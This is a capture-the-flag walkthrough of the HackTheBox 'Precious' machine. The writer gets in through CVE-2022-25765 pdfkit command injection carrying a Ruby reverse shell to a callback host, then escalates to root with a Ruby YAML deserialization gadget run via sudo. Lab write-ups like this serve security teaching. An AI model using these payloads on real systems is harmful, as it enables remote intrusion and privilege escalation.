---
title: "Precious"
date: 2023-02-06T18:00:00-00:00
publishdate: 2023-05-20T18:00:00-00:00
releasedate: 2022-11-26T18:00:00-00:00
draft: false
hideTitle: false
Cover: /htb-info-cards/Precious.png
icon: /htb-box-icons/Precious.png
toc: true
tags: ["Ruby", "CVE", "Plaintext Credentials", "Path Abuse", "Insecure Deserialization"]
categories: ["Walkthrough", "HTB", "Linux", "Easy"]
---

## INTRODUCTION

Precious is an Easy Linux box on HackTheBox, released on November 26, 2022. Its high rating and easy difficulty make it an attactive way to get back into HTB after a short hiatus. It prominently features the Ruby language, and usage of ruby gems - hence the name. While the foothold is fairly straightforward, the path to root takes a bit of thought!

![index page](index%20page.png)



## RECON

[04:00:40] Performing nmap initial scan:
```
nmap -sC -sV -v -n -Pn -oA ./Precious/nmap/init-scan 10.10.11.189
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 04:00 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Initiating SYN Stealth Scan at 04:00
Scanning 10.10.11.189 [1000 ports]
Discovered open port 80/tcp on 10.10.11.189
Discovered open port 22/tcp on 10.10.11.189
Completed SYN Stealth Scan at 04:00, 3.27s elapsed (1000 total ports)
Initiating Service scan at 04:00
Scanning 2 services on 10.10.11.189
Completed Service scan at 04:00, 6.38s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.11.189.
Initiating NSE at 04:00
Completed NSE at 04:00, 5.44s elapsed
Initiating NSE at 04:00
Completed NSE at 04:00, 0.71s elapsed
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Nmap scan report for 10.10.11.189
Host is up (0.18s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 845e13a8e31e20661d235550f63047d2 (RSA)
|   256 a2ef7b9665ce4161c467ee4e96c7c892 (ECDSA)
|_  256 33053dcd7ab798458239e7ae3c91a658 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Initiating NSE at 04:00
Completed NSE at 04:00, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.50 seconds
           Raw packets sent: 1231 (54.164KB) | Rcvd: 1000 (40.008KB)
```


[04:00:57] Performing nmap higher-port scan:
```
nmap -p- --min-rate 5000 -oA ./Precious/nmap/port-scan 10.10.11.189
```
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-05 04:00 EST
Warning: 10.10.11.189 giving up on port because retransmission cap hit (10).
Nmap scan report for precious.htb (10.10.11.189)
Host is up (0.25s latency).
Not shown: 65375 closed tcp ports (reset), 158 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.55 seconds
```


[04:06:26] HTTP VHost enumeration, using ffuf:
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.189:80/ -H "Host: FUZZ.precious.htb" -c -t 40 -o ./Precious/fuzzing/vhost-precious.htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404
```
```
[no result]
```


[04:06:55] HTTP VHost enumeration, using ffuf:
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://10.10.11.189:80/ -H "Host: FUZZ.htb" -c -t 40 -o ./Precious/fuzzing/vhost-htb.md -of md -timeout 4 -ic -ac -mc 200,204,301,307,401,403,405,500,404
```
```
[no result]
```


[04:07:21] HTTP Directory enumeration for precious.htb:
```
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://precious.htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Precious/fuzzing/directory-precious.htb.json
```
```
200      GET       47l       89w      815c http://precious.htb/stylesheets/style.css

200      GET       18l       42w      483c http://precious.htb/

```


[04:08:44] HTTP Directory enumeration for htb:
```
feroxbuster -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories-lowercase.txt -u http://htb -A -d 1 -t 100 -T 4 --burp --smart -o ./Precious/fuzzing/directory-htb.json
```
```
WLD      GET        7l        9w      145c Got 302 for http://htb/639062fb756a4c0a9ecebeb93c6bd040 (url length: 32)
WLD         -         -         - http://htb/639062fb756a4c0a9ecebeb93c6bd040 => http://precious.htb/

302      GET        7l        9w      145c http://htb/639062fb756a4c0a9ecebeb93c6bd040~ => http://precious.htb/

WLD      GET         -         -         - Wildcard response is static; auto-filtering 145 responses; toggle this behavior by using --dont-filter

```

[04:10:03] Discovered the following URIs
    - http://precious.htb/
        - http://precious.htb/stylesheets/style.css
        - http://htb/639062fb756a4c0a9ecebeb93c6bd040
        - http://htb/639062fb756a4c0a9ecebeb93c6bd040~

[04:10:03] Interesting URIs 

   - [no result]

Whatweb info:

```
└─$ whatweb http://$RADDR
http://10.10.11.189 [302 Found] Country[RESERVED][ZZ], HTTPServer[nginx/1.18.0], IP[10.10.11.189], RedirectLocation[http://precious.htb/], Title[302 Found], nginx[1.18.0]
http://precious.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.18.0 + Phusion Passenger(R) 6.0.15], IP[10.10.11.189], Ruby-on-Rails, Title[Convert Web Page to PDF], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-Powered-By[Phusion Passenger(R) 6.0.15], X-XSS-Protection[1; mode=block], nginx[1.18.0]

```

> Having seen no obvious route forward from the port, vhost, and domain enumerations, I decided to instead take a look at the *intended* functionality of the website.



#### Exploring the Intended Functionality

Note: I had already added **precious.htb** to my `/etc/hosts` file. 
Also, I set the target's IP as environment variable `RADDR=10.10.11.189`. My attacking box is `10.10.14.7`

Taking a look at http://precious.htb immediately reveals the purpose of the website: the user provides a URL, and the server then takes a snapshot of that URL and hands you back a PDF of it. Since this is HTB, there is no great way to test this on a public website. So instead, I stood up a webserver using python:

```
sudo ufw allow from $RADDR to any port 8000 proto tcp
python -m SimpleHTTPServer 8000
```

Then I pointed http://precious.htb at my SimpleHTTPServer, and got the expected result:

![test site](test%20site.png)

This got me thinking about doing some kind of script injection or maybe an XXE :thinking: So I checked the PDF's document properties:

```
File name:
pveey83505cuyfqgmkcy3y04bo3isifh.pdf

File size:
10.7 KB (10,931 bytes)

[ ... ]

Generated by pdfkit v0.8.6

PDF Producer:
-

PDF Version:
1.4

Page Count:
1

Page Size:
215.9 × 279.4 mm (Letter, portrait)

Fast Web View:
No 
```

Ok, so it was generated by `pdfkit 0.8.6`, that might be important later. 

> At this point, I did a google search for "pdfkit exploit".
> The first result was a **github repo with a big fat spoiler for this HTB box** 😱 As soon as I saw the word "Precious" I hastily closed the tab like a kid whose parents had just walked-in on them watching explicit materials.
>
> Since HTB is about learning, let's <u>instead look at the second result from that google search</u> (Snyk report, linked below)



## FOOTHOLD

Snyk Vulnerability DB has a page describing CVE-2022-25765: https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
This seems to be a likely candidate, since we already know the site is using ruby-on-rails and a vulnerable version of pdfkit.

I tried catching the POST request from `precious.htb` using burp:

```
POST / HTTP/1.1
Host: precious.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 47
Origin: http://precious.htb
DNT: 1
Connection: close
Referer: http://precious.htb/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html
```

Then I changed the request body to contain the PoC code from CVE-2022-25765 (I changed it to 10 seconds, because my connection is quite bad: 10s stands out a lot more than 5s).

```
url=http%20`sleep 10`%3A%2F%2F10.10.14.7%3A8000%2Findex.html
```



Hmm. Maybe it worked? the server seemed to wait about ten seconds before replying with its "bad URL" message:

```
HTTP/1.1 200 OK
[ ... ]
<body>
    <div class="wrapper">
        <h1 class="title">Convert Web Page to PDF</h1>
        <form action="/" method="post">
            <p>Enter URL to fetch</p><br>
            <input type="text" name="url" value="">
            <input type="submit" value="Submit">
        </form>
        <h2 class="msg">You should provide a valid URL!</h2>
    </div> 
</body>
</html>
```

Let's try it again, but instead this time using a query string in the URL (with a bogus parameter "name"), just like in the Snyk article I linked above. 

```
http://10.10.14.7:8000/index.html?name=#{'%20`sleep 10`'}
```

And this is what I saw in burp after the site performed url-encoding on it:

```
url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html%3Fname%3D%23%7B%27%2520%60sleep+10%60%27%7D
```

*Lo and behold* we get a successful page load, generating the site PDF, after about ten seconds!

:clap: Super! We already know the scripting language (Ruby), and it appears to be listening to arbitrary commands... so lets see if we can open up a reverse shell!

I searched [GTFObins to see if there was an easy ruby reverse shell](https://gtfobins.github.io/gtfobins/ruby/), and indeed there is:

```
export RHOST=attacker.com
export RPORT=12345
ruby -rsocket -e 'exit if fork;c=TCPSocket.new(ENV["RHOST"],ENV["RPORT"]);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

To prepare for the reverse shell, I added a `ufw` rule and set up a `netcat` listener:

```
sudo ufw allow from $RADDR to any port 4444 proto tcp
nc -lvnp 4444
```

Then I modified the ruby reverse shell above to hardcode my IP and nc listener port:

```o
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.7",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

I replaced the `sleep 10` part of the PoC request with the above reverse shell, and proxied through burp:

```
http://10.10.14.7:8000/index.html?name=#{\%20`ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.7",4444);while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'`}
```

... and proxied it through burp (again, to match the url encoding scheme):

```
url=http%3A%2F%2F10.10.14.7%3A8000%2Findex.html%3Fname%3D%23%7B%2520%60ruby+-rsocket+-e+%27exit+if+fork%3Bc%3DTCPSocket.new%28%2210.10.14.7%22%2C4444%29%3Bwhile%28cmd%3Dc.gets%29%3BIO.popen%28cmd%2C%22r%22%29%7B%7Cio%7Cc.print+io.read%7Dend%27%60%7D
```

:sunglasses: and there's our reverse shell!

```
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.7] from (UNKNOWN) [10.10.11.189] 54294
id
uid=1001(ruby) gid=1001(ruby) groups=1001(ruby)
```



## USER FLAG

Check `/etc/passwd` and see who's on the box:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
sshd:x:104:65534::/run/sshd:/usr/sbin/nologin
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
systemd-timesync:x:999:999:systemd Time Synchronization:/:/usr/sbin/nologin
systemd-coredump:x:998:998:systemd Core Dumper:/:/usr/sbin/nologin
ruby:x:1001:1001::/home/ruby:/bin/bash
_laurel:x:997:997::/var/log/laurel:/bin/false
```

> Even though the box seems to have python3, I was not able to upgrade my shell using it. *No idea why.* 
> Same with perl... *what the heck!*
> And if I try even checking if socat is on the machine, my connection is terminated! *What the heckin' heck!?* :skull_and_crossbones: 
>
> I can't even change directories with this useless shell :angry:

Oh well. Let's just look for the user flag and try to get past this step using the dumb shell. The flag is almost always in the foothold user's home directory:

```
ls -la /home/ruby
/home/ruby:
total 28
drwxr-xr-x 4 ruby ruby 4096 Feb  5 16:03 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Feb  5 16:03 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile
```

No flag... I also checked the contents of `.bash_logout` and `.profile`. Perhaps it's one of those directories?

```
ls -laR /home/ruby
/home/ruby:
total 28
drwxr-xr-x 4 ruby ruby 4096 Feb  5 16:03 .
drwxr-xr-x 4 root root 4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root root    9 Oct 26 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 ruby ruby  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ruby ruby 3526 Mar 27  2022 .bashrc
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .bundle
drwxr-xr-x 3 ruby ruby 4096 Feb  5 16:03 .cache
-rw-r--r-- 1 ruby ruby  807 Mar 27  2022 .profile

/home/ruby/.bundle:
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 4 ruby ruby 4096 Feb  5 16:03 ..
-r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config

/home/ruby/.cache:
total 12
drwxr-xr-x 3 ruby ruby 4096 Feb  5 16:03 .
drwxr-xr-x 4 ruby ruby 4096 Feb  5 16:03 ..
drwxr-xr-x 2 ruby ruby 4096 Feb  5 16:03 fontconfig

/home/ruby/.cache/fontconfig:
total 68
drwxr-xr-x 2 ruby ruby  4096 Feb  5 16:03 .
drwxr-xr-x 3 ruby ruby  4096 Feb  5 16:03 ..
-rw-r--r-- 1 ruby ruby   200 Feb  5 16:03 7fbdb48c-391b-4ace-afa2-3f01182fb901-le64.cache-7
-rw-r--r-- 1 ruby ruby   144 Feb  5 16:03 8750a791-6268-4630-a416-eea4309e7c79-le64.cache-7
-rw-r--r-- 1 ruby ruby   200 Feb  5 16:03 CACHEDIR.TAG
-rw-r--r-- 1 ruby ruby 15560 Feb  5 16:03 cb67f001-8986-4483-92bd-8d975c0d33c3-le64.cache-7
-rw-r--r-- 1 ruby ruby 29512 Feb  5 16:03 ef96da78-736b-4d54-855c-6cd6306b88f9-le64.cache-7
```

Ok, still no flag, but the file `/home/ruby/.bundle/config` intrigues me. Let's take a look:

![found creds-blurred](found%20creds-blurred.png)

Oh, nice! a credential! I wonder what it's for. 
Since we already know the box is running ssh, let's try that:

```
┌──(kali㉿kali)-[~]
└─$ ssh henry@$RADDR         
The authenticity of host '10.10.11.189 (10.10.11.189)' can't be established.
ED25519 key fingerprint is SHA256:1WpIxI8qwKmYSRdGtCjweUByFzcn0MSpKgv+AwWRLkU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.189' (ED25519) to the list of known hosts.
henry@10.10.11.189's password: 
Linux precious 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
henry@precious:~$ 

```

> *Oh thank goodness* :sweat_smile: *I was so sick of that `ruby` shell.* 

Since `ruby` didn't have the user flag, and there are only two users on the box with a home directory, we know `henry` must have the user flag. Just `cat` it:

```
henry@precious:~$ ls -la
total 24
drwxr-xr-x 2 henry henry 4096 Oct 26 08:28 .
drwxr-xr-x 4 root  root  4096 Oct 26 08:28 ..
lrwxrwxrwx 1 root  root     9 Sep 26 05:04 .bash_history -> /dev/null
-rw-r--r-- 1 henry henry  220 Sep 26 04:40 .bash_logout
-rw-r--r-- 1 henry henry 3526 Sep 26 04:40 .bashrc
-rw-r--r-- 1 henry henry  807 Sep 26 04:40 .profile
-rw-r----- 1 root  henry   33 Feb  5 16:00 user.txt

```



## ROOT FLAG

One of the first things I like to check for privilege escalation is PATH abuse:

```
henry@precious:~$ id
uid=1000(henry) gid=1000(henry) groups=1000(henry)

henry@precious:~$ echo $PATH
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

henry@precious:~$ find / -user henry 2>/dev/null | grep -v proc
/home/henry
/home/henry/.profile
/home/henry/.bash_logout
/home/henry/.bashrc
/dev/pts/0
/run/user/1000
/run/user/1000/systemd
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/chr
/run/user/1000/systemd/inaccessible/sock
/run/user/1000/systemd/inaccessible/fifo
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg

henry@precious:~$ find / -group henry 2>/dev/null | grep -v proc
[ same as -user results]
```

Ok, no good PATH abuse opportunity.

Next I like to check the user's crontab:

```
henry@precious:~$ crontab -l
no crontab for henry
```

Alright, next up is to check for **sudo** privileges:

```
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb

```

Oh boy, now we're cooking. `henry` can sudo `ruby /opt/update_dependencies.rb`. Let's take a look at what that file does:

```
henry@precious:~$ cat /opt/update_dependencies.rb 
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

If I try running `update_dependencies.rb`, an error occurs

```
henry@precious:~$ sudo ruby /opt/update_dependencies.rb 
Traceback (most recent call last):
        2: from /opt/update_dependencies.rb:17:in `<main>'
        1: from /opt/update_dependencies.rb:10:in `list_from_file'
/opt/update_dependencies.rb:10:in `read': No such file or directory @ rb_sysopen - dependencies.yml (Errno::ENOENT)

```

Apparently it can't find `dependencies.yml` :thinking: Hmm... that seems a little broken. If it's not adjacent to `update_dependencies.rb`, where is it?

```
henry@precious:~$ find / -name "dependencies.yml" 2>/dev/null
/opt/sample/dependencies.yml
```

> :thumbsup: Ah, OK. Looking over  `update_dependencies.rb` again, I see that it's using a relative path for loading `dependencies.yml`.
> :thumbsdown: But... I don't have any way of writing to the directory from which it will load `dependecies.yml` 

I'll try copying the sample file into `/home/henry` just to see what happens

```
henry@precious:~$ cp /opt/sample/dependencies.yml .
henry@precious:~$ sudo ruby /opt/update_dependencies.rb 
Installed version differs from the one specified in file: yaml
Installed version is equals to the one specified in file: pdfkit
```

:flushed: Wait... WHAT?! No way. It actually ran? It didn't fail to find `dependencies.yml`???
Ruby must have some kind of environment variable that it sets when it runs, some kind of internal PATH that includes the directory where the command was invoked from. Why on earth would it do that?

### Aside: How do filepaths work with ruby's File.read() ?

Just to check if the above conclusion is true, I tried three more things:

1. Running `/opt/update_dependenceies.rb` from a directory unrelated to `dependencies.yml` (/tmp)
2. Running `/opt/update_dependenceies.rb` from a child directory to the one containing `dependencies.yml`
3. Moving `dependencies.yml` into that child directory then running `/opt/update_dependenceies.rb` from that dir's parent.

![file open path handling in ruby](file%20open%20path%20handling%20in%20ruby.png)

All three failed. Thank goodness. If any of those worked, that would have been phenomenally stupid.


### Back to privesc

Since we don't even need write permissions to `/opt` to run  `/opt/update_dependenceies.rb` using a custom YAML file, this is suddenly going to be much easier.

Certain that this has been done before, I googled the innocuous terms "Ruby YAML deserialization". Only a few results down were several writeups with PoC code to exploit Ruby's unsafe handling of `YAML.load()`. One of the results was [a page in PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md).

Since the payload is dependent on ruby version, I checked the ruby version on the target machine with `ruby -v`: it is 2.7.4. There is a section of the [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/Ruby.md) page applicable to this version, with the following "universal gadget":

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

I then wrote the above into `/home/henry/dependencies.yml` and re-ran `/opt/update_dependencies.rb`:

![yaml deserialization proof](yaml%20deserialization%20proof.png)

Ignore the traceback: the payload `id` worked! Let's I'll modify this to open up a root shell instead of just running `id`. 

So instead of running `id`, just run `bash`. Yep, it really is that simple :thumbsup:

```
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: bash
         method_id: :resolve
```

![root shell-blurred](root%20shell-blurred.png)

And there's the root flag! :tada:



## LESSONS LEARNED

{{% lessons-learned attacker=true %}}

### Attacker

- Use searchsploit and a search engine often. During a penetration test, it is fair game to build on the work of others: for an HTB box, chances are low that you're going to blaze a new trail and write novel PoC code, so always check for CVEs!
- Utilize an enumeration tool like **linpeas** early on, once you've gained a foothold. This can help you rapidly find the vulnerabilities that you'll need to get the flags.
- Keep the name of the box in mind. In this case, "precious" is a reference to "ruby", which was a major hint for later in the box.
  {{% /lessons-learned %}}

{{% lessons-learned defender=true %}}

### Defender

- If you're making a web service that generates PDFs, you absolutely must:
  - Sanitize any user input. Foothold could have been prevented by eliminating the backticks in the provided URL.
  - Use an up-to-date version of your the PDF writer.
- Never leave credentials for one user inside a file owned by another user. Please just use a password manager.
- Ruby handles relative filepaths in a way I never would have expected. Consider using absolute filepaths instead.
- If you're using Ruby, make sure you use `YAML.safe_load()` instead of the unsafe (and deprecated) `YAML.load()`.
  {{% /lessons-learned %}}
